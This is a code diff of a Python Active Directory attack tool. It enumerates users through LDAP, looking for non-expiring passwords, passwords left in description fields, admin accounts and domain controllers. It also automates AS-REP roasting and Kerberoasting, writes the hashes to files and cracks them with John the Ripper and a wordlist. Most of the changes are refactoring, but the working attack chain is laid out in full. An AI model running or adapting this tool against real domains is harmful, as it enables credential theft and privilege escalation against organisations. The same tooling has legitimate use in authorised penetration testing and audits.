@@ -55,7 +55,7 @@ class LdapEnum:
         print("===================== Enum LDAP ====================")
         print("====================================================\n\n")
         
-    def __SearchUserServerLdap(self,OBJECT_TO_SEARCH, ATTRIBUTES_TO_SEARCH):
+    def __SearchServerLdap(self,OBJECT_TO_SEARCH, ATTRIBUTES_TO_SEARCH):
         try:
             result = self.ldapCon.search_s(self.baseDn, ldap.SCOPE_SUBTREE, OBJECT_TO_SEARCH, ATTRIBUTES_TO_SEARCH) 
         except ldap.LDAPError as error:
@@ -76,12 +76,12 @@ class LdapEnum:
         shift = 10_000_000
         return (timestamp*shift) + magic_number
 
-    def SearchUserServerLdapUser(self,OBJECT_TO_SEARCH):
+    def SearchServerLdapUser(self,OBJECT_TO_SEARCH):
         ATTRIBUTES_TO_SEARCH = ['sAMAccountName']
         try:
             result = self.ldapCon.search_s(self.baseDn, ldap.SCOPE_SUBTREE, OBJECT_TO_SEARCH, ATTRIBUTES_TO_SEARCH) 
         except ldap.LDAPError as error:
-            print(error)
+            log.warning(error)
             exit(0)
         resultSearch = []
         for info in result:
@@ -152,7 +152,7 @@ class LdapEnum:
         OBJECT_TO_SEARCH = '(&(objectCategory=user)'+timeFilter+')'
         ATTRIBUTES_TO_SEARCH = ['pwdLastSet','sAMAccountName']
         
-        result = self.__SearchUserServerLdap(OBJECT_TO_SEARCH, ATTRIBUTES_TO_SEARCH)
+        result = self.__SearchServerLdap(OBJECT_TO_SEARCH, ATTRIBUTES_TO_SEARCH)
         for info in result:
             timestamp = int(info[1]['pwdLastSet'][0].decode())
             username = info[1]['sAMAccountName'][0].decode()
@@ -169,7 +169,7 @@ class LdapEnum:
         OBJECT_TO_SEARCH = '(&(objectCategory=user)(|(description=*pwd*)(description=*password*)))'
         ATTRIBUTES_TO_SEARCH = ['sAMAccountName','description']
 
-        result = self.__SearchUserServerLdap(OBJECT_TO_SEARCH, ATTRIBUTES_TO_SEARCH)
+        result = self.__SearchServerLdap(OBJECT_TO_SEARCH, ATTRIBUTES_TO_SEARCH)
         for info in result:
             username = info[1]['sAMAccountName'][0].decode()
             description = info[1]['description'][0].decode()
@@ -180,22 +180,25 @@ class LdapEnum:
 
         OBJECT_TO_SEARCH = '(&(objectCategory=user)(adminCount=1))'
 
-        result = self.SearchUserServerLdapUser(OBJECT_TO_SEARCH)
+        result = self.SearchServerLdapUser(OBJECT_TO_SEARCH)
         for info in result:
+            baseName = info[0]
             username = info[1]
-            print("[i] Username:",highlightRed(username),CreateSpace(username), LdapPathColor(info[0]))
+            print("[i] Username:",highlightRed(username),CreateSpace(username), LdapPathColor(baseName))
+
     def GetDomainControllers(self):
         printTitle("[-] Domain Controllers")
 
         OBJECT_TO_SEARCH = '(&(objectCategory=computer)(userAccountControl:1.2.840.113556.1.4.803:=8192))'
         ATTRIBUTES_TO_SEARCH = ["sAMAccountName","operatingSystem","operatingSystemVersion"]
 
-        result = self.__SearchUserServerLdap(OBJECT_TO_SEARCH,ATTRIBUTES_TO_SEARCH)
+        result = self.__SearchServerLdap(OBJECT_TO_SEARCH,ATTRIBUTES_TO_SEARCH)
         for info in result:
+            baseName = info[0]
             ComputerName = info[1]["sAMAccountName"][0].decode()
             ComputerOsName = info[1]["operatingSystem"][0].decode()
             ComputerOsVersion = info[1]["operatingSystemVersion"][0].decode()
-            print("[i] Computer:",highlightRed(ComputerName),CreateSpace(ComputerName),LdapPathColor(info[0]))
+            print("[i] Computer:",highlightRed(ComputerName),CreateSpace(ComputerName),LdapPathColor(baseName))
             print("\t[v]",ComputerOsName, ComputerOsVersion)
 
     def PasswordNotExpire(self):
@@ -203,17 +206,19 @@ class LdapEnum:
 
         OBJECT_TO_SEARCH = '(&(objectcategory=user)(userAccountControl:1.2.840.113556.1.4.803:=65536))'
 
-        result = self.SearchUserServerLdapUser(OBJECT_TO_SEARCH)
+        result = self.SearchServerLdapUser(OBJECT_TO_SEARCH)
         for info in result:
+            baseName = info[0]
             username = info[1]
-            print("[i] Username:",highlightRed(username),CreateSpace(username),LdapPathColor(info[0]))
+            print("[i] Username:",highlightRed(username),CreateSpace(username),LdapPathColor(baseName))
+
     def UserDefEncrypt(self):
         printTitle("[-] Users with not the default encryption")
 
         OBJECT_TO_SEARCH = '(&(objectCategory=person)(objectClass=user)(msDS-SupportedEncryptionTypes=*))'
         ATTRIBUTES_TO_SEARCH = ['msDS-SupportedEncryptionTypes', 'sAMAccountName']
 
-        result = self.__SearchUserServerLdap(OBJECT_TO_SEARCH, ATTRIBUTES_TO_SEARCH)
+        result = self.__SearchServerLdap(OBJECT_TO_SEARCH, ATTRIBUTES_TO_SEARCH)
         for info in result:
             username = info[1]['sAMAccountName'][0].decode()
             algoType = info[1]['msDS-SupportedEncryptionTypes'][0].decode()
@@ -232,19 +237,20 @@ class LdapEnum:
             else: 
                  algoType = "Password is stored in "+str(algoType)+" encryption"
             print("[i] Username:",highlightRed(username),CreateSpace(username),algoType)
-
         return
+        
     def UserNoDelegation(self):
         printTitle("[-] Protecting Privileged Domain Accounts")
 
         OBJECT_TO_SEARCH = '(&(objectCategory=person)(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=1048576))'
 
-        result = self.SearchUserServerLdapUser(OBJECT_TO_SEARCH)
+        result = self.SearchServerLdapUser(OBJECT_TO_SEARCH)
         for info in result:
+            baseName = info[0]
             username = info[1]
-            log.info("Username: " + highlightRed(username) + CreateSpace(username) +LdapPathColor(info[0]))
+            log.info("Username: " + highlightRed(username) + CreateSpace(username) +LdapPathColor(baseName))
             
-    
+   
     def deconnect(self):
         self.ldapCon.unbind() 
 
@@ -286,9 +292,12 @@ class KerbExploit:
         process =  subprocess.run((self.johnPath, filenName,algoType, "--wordlist=" + self.wordlistPath), check=True, stdout=subprocess.PIPE, stderr=subprocess.DEVNULL) 
 
         if('krb5asrep' in algoType):
-            regexHashUser = r"(.*[^\s-])\s+\(\$krb5\w+\$23\$(\w+)@.+\.\w+\)"
+            regexHashUser = r"(.*[^\s-])\s+\(\$krb5\w+\$23\$(\w+-?\w+)@.+\.\w+\)"
         elif('krb5tgs' in algoType):
             regexHashUser = r"(.*[^\s-])\s+\(\?\)"
+        else:
+            log.warning('Fail to detect hash !')
+            return isSuccess
         output = process.stdout.decode()
         for output in output.splitlines():
             x = re.search(regexHashUser, output)
@@ -302,7 +311,7 @@ class KerbExploit:
                     log.success("Cread Found: '" + highlightGreen(x.group(1))+"'")
                     isSuccess = True
                 else:
-                    log.error('Fail get hash !')
+                    log.warning('Fail get hash !')
         progress.success(status='Done')
         return isSuccess
     def __ExploitASREP(self, username, outputFile):
@@ -339,14 +348,15 @@ class KerbExploit:
 
         isSuccess = False
         OBJECT_TO_SEARCH = '(&(samAccountType=805306368)(userAccountControl:1.2.840.113556.1.4.803:=4194304))'
-        result = self.ldapEnum.SearchUserServerLdapUser(OBJECT_TO_SEARCH)
-        
+        result = self.ldapEnum.SearchServerLdapUser(OBJECT_TO_SEARCH)
+
         for info in result:
+            baseName = info[0]
             username = info[1]
-            log.info("Username: " + highlightRed(username) + CreateSpace(username) +LdapPathColor(info[0]))
-            isSuccess = self.__ExploitASREP(info[1], outputFile)
+            log.info("Username: " + highlightRed(username) + CreateSpace(username) +LdapPathColor(baseName))
+            isSuccess = self.__ExploitASREP(username, outputFile)
         if(isSuccess):
-            log.success("Hash added to file:        " + outputFile)
+            log.success("Hash added to file:                " + outputFile)
         return isSuccess
     def Kerberoastable(self,username, password, outputFile = "kerbHash.hash"):
         printTitle("[-] Kerberoastable Users")
@@ -354,14 +364,15 @@ class KerbExploit:
         isSuccess = False
         OBJECT_TO_SEARCH = '(&(samAccountType=805306368)(servicePrincipalName=*)(!(samAccountName=krbtgt))(!(UserAccountControl:1.2.840.113556.1.4.803:=2)))'
         
-        result = self.ldapEnum.SearchUserServerLdapUser(OBJECT_TO_SEARCH)
+        result = self.ldapEnum.SearchServerLdapUser(OBJECT_TO_SEARCH)
         
         for info in result:
+            baseName = info[0]
             targetUsername = info[1]
-            log.info("Username: " + highlightRed(targetUsername) + CreateSpace(targetUsername) + ""+LdapPathColor(info[0])+"")
+            log.info("Username: " + highlightRed(targetUsername) + CreateSpace(targetUsername) + LdapPathColor(baseName))
             isSuccess = self.__ExploitKerberoasting(targetUsername,username, password,targetUsername, outputFile)
         if(isSuccess):
-            log.success("Hash added to file:        " + outputFile)
+            log.success("Hash added to file:                " + outputFile)
         return isSuccess
     def DefaultConfig(self, ouputFile, formatHash):
         configDefault = {
@@ -379,7 +390,7 @@ class KerbExploit:
         configASREP['isHashFound'] = self.ASREP_Roastable(configASREP['ouputFile'])
         configFileKerb['isHashFound'] = self.Kerberoastable(userConfig['username'], userConfig['password'],configFileKerb['ouputFile'])
 
-        if((configASREP['isHashFound'] or configFileKerb['isHashFound'])  and userConfig['baseDN']):
+        if((configASREP['isHashFound'] or configFileKerb['isHashFound']) and userConfig['baseDN']):
             printTitle("[-] Starting to crack hashs")
             if(configASREP['isHashFound']):
                 self.RunJohn(configASREP['ouputFile'], configASREP['formatHash'])
